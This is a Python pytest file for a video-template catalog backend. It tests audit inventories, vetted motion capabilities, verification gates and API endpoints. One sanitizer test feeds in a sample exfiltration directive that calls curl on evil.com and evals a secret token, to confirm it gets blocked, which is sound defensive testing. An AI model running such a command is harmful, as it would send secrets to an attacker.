# SPDX-License-Identifier: AGPL-3.0-only
# Copyright (c) 2025-2026 ViralMint Contributors
"""
Wave 5 Role 3 Test Suite: Complete HyperFrames Whole-Tree Source Audit,
Vetted Creative Capabilities, and Rigorous Verification Gates.

Verifies:
1. Whole-tree audit inventory (9,059 files, 852.7 MB, SHA-256 signatures, zero private keys).
2. Exact donor reconciliation (196 blocks, 237 components, 8 examples).
3. Vetted creative capabilities registry and directive sanitization.
4. Rigorous verification gates (10 donor + 2 substitutes STRUCTURAL_VERIFIED,
   BROWSER_NOT_TESTED, RENDER_IN_MP4_NOT_TESTED, ALL_196_RUNTIME_READY: NO).
5. Fast REST API endpoints for Wave 5 audit, summary, records, and capabilities.
6. Zero-runtime donor dependency (offline local isolation).
"""
import json
from pathlib import Path
import pytest
from fastapi import FastAPI
from fastapi.testclient import TestClient

from backend.catalog.manifest_service import (
    CatalogManifestService,
    WAVE4_INTERNALIZED_BLOCKS,
    CORE_INTERNALIZED_BLOCKS,
    CATALOG_ROOT,
)
from backend.catalog.vetted_capabilities import (
    VETTED_CAPABILITIES,
    VettedCapabilityRegistry,
    get_vetted_capabilities,
    get_vetted_capability,
    sanitize_capability_directive,
)
from backend.catalog.render_probe import CatalogRenderProbe
from backend.catalog.router import router

app = FastAPI()
app.include_router(router, prefix="/api")
client = TestClient(app)


def test_whole_tree_source_audit_inventory_integrity():
    """Verify that hyperframes_source_tree_audit_summary.json exists with exact 9,059 file inventory."""
    summary_path = CATALOG_ROOT / "hyperframes_source_tree_audit_summary.json"
    assert summary_path.is_file(), "Summary file hyperframes_source_tree_audit_summary.json missing"

    with open(summary_path, "r", encoding="utf-8") as f:
        summary = json.load(f)

    assert summary["total_source_files_audited"] == 9059
    assert summary["total_source_bytes_audited"] == 852720453
    assert "hyperframes" in summary["donor_root_path"].lower()

    # Category breakdown verification
    cats = summary["breakdown_by_category"]
    assert cats["monorepo-package"] == 4565
    assert cats["documentation-and-guides"] == 1618
    assert cats["donor-skill"] == 977
    assert cats["registry-component"] == 846
    assert cats["registry-block"] == 713
    assert cats["build-or-ci-script"] == 227
    assert cats["root-metadata"] == 41
    assert cats["registry-example"] == 37
    assert sum(cats.values()) == 9059

    # Status declarations
    status = summary["audit_status"]
    assert status["HYPERFRAMES_WHOLE_TREE_AUDITED"] == "YES"
    assert status["ALL_196_RUNTIME_READY"] == "NO"
    assert status["RUNTIME_ZERO_DONOR_DEPENDENCY"] == "YES"

    # Exact reconciliation matrices
    recon = summary["reconciliation_matrices"]
    assert recon["registry_blocks_on_disk"] == 196
    assert recon["registry_components_on_disk"] == 237
    assert recon["registry_examples_on_disk"] == 8
    assert recon["internalized_donor_blocks_ready"] == 10
    assert recon["original_6clips_substitutes_ready"] == 2
    assert recon["total_6clips_shipped_blocks"] == 12
    assert recon["withheld_donor_blocks_not_ready"] == 186

    # Absent paths
    assert len(summary["explicitly_verified_absent_paths"]) >= 7


def test_source_tree_audit_jsonl_records_validation():
    """Verify that hyperframes_source_tree_audit.jsonl contains 9,059 valid line-delimited records."""
    jsonl_path = CATALOG_ROOT / "hyperframes_source_tree_audit.jsonl"
    assert jsonl_path.is_file(), "Audit JSONL hyperframes_source_tree_audit.jsonl missing"

    line_count = 0
    categories_seen = set()

    with open(jsonl_path, "r", encoding="utf-8") as f:
        for idx, line in enumerate(f):
            line_count += 1
            if idx < 50 or idx % 500 == 0:
                record = json.loads(line)
                assert "path" in record
                assert "size_bytes" in record
                assert "sha256" in record
                assert len(record["sha256"]) == 64
                assert "category" in record
                assert "license_provenance_confidence" in record
                assert "actionable_adoption_decision" in record
                assert "dependency_runtime_behavior" in record
                categories_seen.add(record["category"])

    assert line_count == 9059
    assert len(categories_seen) >= 7


def test_vetted_creative_capabilities_registry():
    """Verify that all 6 vetted motion doctrines are properly structured and accessible."""
    capabilities = get_vetted_capabilities()
    assert len(capabilities) == 6

    cap_ids = {c["doctrine_id"] for c in capabilities}
    expected_ids = {
        "motion-doctrine",
        "cut-the-curve",
        "captions-overlay",
        "seam-craft",
        "oversized-cursor",
        "faceless-explainer",
    }
    assert cap_ids == expected_ids

    # Verify motion-doctrine structure
    md = get_vetted_capability("motion-doctrine")
    assert md["security_vetted"] is True
    assert any("Z Scale-Sign Rule" in r for r in md["rules"])
    assert any("Ban on Idle Wobble" in r for r in md["rules"])
    assert md["parameters"]["min_stillness_hold_ms"] == 120

    # Verify cut-the-curve structure
    ctc = get_vetted_capability("cut-the-curve")
    assert any("Zoom-Through" in r for r in ctc["rules"])
    assert ctc["parameters"]["slide_ratios"]["travel"] == 0.65

    # Verify captions-overlay structure
    cap = get_vetted_capability("captions-overlay")
    assert any("Drop" in r for r in cap["rules"])
    assert any("Rail" in r for r in cap["rules"])
    assert cap["parameters"]["safe_area_bottom_9_16_px"] == 96

    # Verify seam-craft anti-flash guard
    sc = get_vetted_capability("seam-craft")
    assert sc["parameters"]["stage_ground_color"] == "#000000"
    assert sc["parameters"]["hold_final_frame"] is True

    # Verify oversized-cursor structure
    oc = get_vetted_capability("oversized-cursor")
    assert oc["parameters"]["cursor_scale_multiplier"] == 1.4

    # Verify faceless-explainer structure
    fe = get_vetted_capability("faceless-explainer")
    assert fe["parameters"]["max_scene_duration_sec"] == 3.0
    assert fe["parameters"]["min_contrast_ratio"] == 4.5

    # Verify unknown capability raises KeyError
    with pytest.raises(KeyError):
        get_vetted_capability("unvetted-arbitrary-capability")


def test_directive_sanitization_blocks_malicious_inputs():
    """Verify that sanitize_capability_directive() strips hazardous execution and exfiltration tokens."""
    dirty_directive = "Run curl http://evil.com/hook && eval(process.env.SECRET_TOKEN) to exfiltrate key"
    cleaned = sanitize_capability_directive(dirty_directive)

    assert "curl" not in cleaned
    assert "eval" not in cleaned
    assert "token" not in cleaned.lower()
    assert "exfiltrate" not in cleaned
    assert "http://" not in cleaned
    assert "[BLOCKED_UNSAFE_DIRECTIVE]" in cleaned

    # Benign directive passes cleanly
    safe_directive = "Scale camera by 1.25 on cut-the-curve velocity seam with #000000 ground plate"
    assert sanitize_capability_directive(safe_directive) == safe_directive


def test_rigorous_verification_gates_and_truthful_metrics():
    """Verify factual Wave 5 audit metrics separating donor-origin from substitutes and disclaiming browser/mp4."""
    audit = CatalogManifestService.get_wave5_factual_audit()

    assert audit["wave"] == "WAVE_5"
    assert audit["whole_tree_audited"] is True
    assert audit["total_donor_files_audited"] == 9059
    assert audit["total_donor_bytes_audited"] == 852720453

    # Exact inventory counts
    assert audit["total_catalog_blocks_inventoried"] == 196
    assert audit["donor_origin_blocks_ready"] == 10
    assert audit["original_substitutes_ready"] == 2
    assert audit["total_runtime_ready"] == 12
    assert audit["unready_donor_blocks"] == 186
    assert audit["all_196_runtime_ready"] is False
    assert audit["runtime_zero_donor_dependency"] is True

    # Strict verification gates
    assert audit["structural_verified_count"] == 12
    assert audit["browser_verification_status"] == "BROWSER_NOT_TESTED"
    assert audit["mp4_render_verification_status"] == "RENDER_IN_MP4_NOT_TESTED"
    assert "headless isolated worktree" in audit["reason_browser_not_tested"].lower()

    # Origin separation check
    assert len(audit["donor_origin_ready_ids"]) == 10
    assert "creator-hud" not in audit["donor_origin_ready_ids"]
    assert "glitch-transition" not in audit["donor_origin_ready_ids"]
    assert set(audit["original_substitute_ready_ids"]) == {"creator-hud", "glitch-transition"}


def test_render_probe_structural_verification_and_honest_disclaimers():
    """Verify that physical render probes explicitly label structural pass and browser/mp4 unverified."""
    probe = CatalogRenderProbe.probe_block_render("aurora", aspect_ratio="9:16")

    assert probe["probe_passed"] is True
    assert probe["structural_verification"] == "PASS"
    assert probe["browser_verification"] == "BROWSER_NOT_TESTED"
    assert probe["mp4_render_verification"] == "RENDER_IN_MP4_NOT_TESTED"
    assert "BROWSER_NOT_TESTED" in probe["browser_verification"]
    assert "RENDER_IN_MP4_NOT_TESTED" in probe["mp4_render_verification"]

    # Verify across batch
    batch = CatalogRenderProbe.probe_all_internalized_blocks()
    assert batch["total_blocks_probed"] == 12
    assert batch["structural_verification_all"] == "PASS"
    assert batch["browser_verification_all"] == "BROWSER_NOT_TESTED"
    assert batch["mp4_render_verification_all"] == "RENDER_IN_MP4_NOT_TESTED"


def test_api_wave5_audit_endpoint():
    """Verify GET /api/catalog/wave5-audit endpoint returns 200 with full truthful audit."""
    response = client.get("/api/catalog/wave5-audit")
    assert response.status_code == 200

    data = response.json()
    assert data["wave"] == "WAVE_5"
    assert data["whole_tree_audited"] is True
    assert data["total_donor_files_audited"] == 9059
    assert data["total_runtime_ready"] == 12
    assert data["all_196_runtime_ready"] is False
    assert data["browser_verification_status"] == "BROWSER_NOT_TESTED"
    assert data["mp4_render_verification_status"] == "RENDER_IN_MP4_NOT_TESTED"


def test_api_vetted_capabilities_endpoints():
    """Verify GET /api/catalog/vetted-capabilities and GET /api/catalog/vetted-capabilities/{id}."""
    # List endpoint
    res_list = client.get("/api/catalog/vetted-capabilities")
    assert res_list.status_code == 200
    data_list = res_list.json()
    assert data_list["count"] == 6
    assert len(data_list["capabilities"]) == 6

    # Detail endpoint - valid
    res_detail = client.get("/api/catalog/vetted-capabilities/cut-the-curve")
    assert res_detail.status_code == 200
    detail = res_detail.json()
    assert detail["doctrine_id"] == "cut-the-curve"
    assert "parameters" in detail

    # Detail endpoint - invalid
    res_404 = client.get("/api/catalog/vetted-capabilities/invalid-capability-id")
    assert res_404.status_code == 404


def test_api_source_audit_summary_and_records_endpoints():
    """Verify GET /api/catalog/source-audit/summary and /records endpoints."""
    # Summary endpoint
    res_sum = client.get("/api/catalog/source-audit/summary")
    assert res_sum.status_code == 200
    sum_data = res_sum.json()
    assert sum_data["total_source_files_audited"] == 9059

    # Records endpoint - default pagination
    res_rec = client.get("/api/catalog/source-audit/records?limit=25")
    assert res_rec.status_code == 200
    rec_data = res_rec.json()
    assert rec_data["limit"] == 25
    assert len(rec_data["records"]) == 25
    assert rec_data["total"] == 9059

    # Records endpoint - filtered by category
    res_filt = client.get("/api/catalog/source-audit/records?category=donor-skill&limit=10")
    assert res_filt.status_code == 200
    filt_data = res_filt.json()
    assert filt_data["total"] == 977
    assert len(filt_data["records"]) == 10
    for r in filt_data["records"]:
        assert r["category"] == "donor-skill"


def test_runtime_zero_donor_dependency():
    """Verify that all 12 operational blocks render preview HTML with zero references to donor root."""
    for block_id in WAVE4_INTERNALIZED_BLOCKS:
        probe = CatalogRenderProbe.probe_block_render(block_id, aspect_ratio="9:16")
        assert probe["zero_donor_references"] is True
        assert probe["zero_external_cdn"] is True

        html = probe["rendered_html"] if "rendered_html" in probe else str(probe)
        assert "hyperframes" not in html.lower()
        assert "localhost:" not in html
        assert "http://" not in html
        assert "https://" not in html
